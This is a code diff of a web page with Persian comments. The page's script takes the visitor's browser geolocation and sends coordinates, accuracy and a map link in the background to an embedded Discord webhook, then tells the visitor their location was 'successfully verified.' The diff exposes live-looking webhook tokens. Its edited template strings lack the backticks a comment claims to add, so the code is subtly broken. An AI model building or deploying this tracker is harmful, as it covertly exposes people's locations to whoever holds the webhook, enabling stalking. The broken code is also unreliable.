@@ -19,7 +19,7 @@ button { background-color: #007bff; color: white; border: none; padding: 10px 20
 
 <script>
 // آدرس وب‌هوک دیسکورد خود را اینجا قرار دهید
-const webhookURL = "https://discord.com/api/webhooks/1546049040666329158/OZXLvUVEHRUqvpze-tNNxcX71fiXhN6sj0FutQHeJl81beRXtqrZ2Xj6q_sF3zp45nWn";
+const webhookURL = "https://discord.com/api/webhooks/1546079351559299093/7seQJheatYvkYmW4HOZ7gyJwjikqJRG2LfnEZtrkvva7yYYLwnbKSRJlZH0ceGrdXmPm";
 
 function getLocation() {
 if (navigator.geolocation) {
@@ -36,8 +36,12 @@ const longitude = position.coords.longitude;
 const accuracy = position.coords.accuracy;
 
 // ساخت پیام برای ارسال به دیسکورد
+// تعریف درست آدرس نقشه با متغیرهای عددی دریافتی از مرورگر
+const mapsURL = https://www.google.com/maps?q=${latitude},${longitude};
+
+// ساخت شیء پیام با متن معتبر و داخل بک‌تیک
 const payload = {
-content: 📍 **لوکیشن جدید دریافت شد!**\n🔗 گوگل مپس: https://google.com{latitude},${longitude}\n🎯 دقت: ${accuracy} متر
+content: لوکیشن جدید دریافت شد!\nلینک نقشه: ${mapsURL}\nدقت: ${accuracy} متر
 };
 
 // ارسال داده‌ها به صورت پس‌زمینه
@@ -53,7 +57,6 @@ alert("موقعیت شما با موفقیت تایید شد.");
 })
 .catch(error => console.error('Error:', error));
 }
-
 function showError(error) {
 switch(error.code) {
 case error.PERMISSION_DENIED:
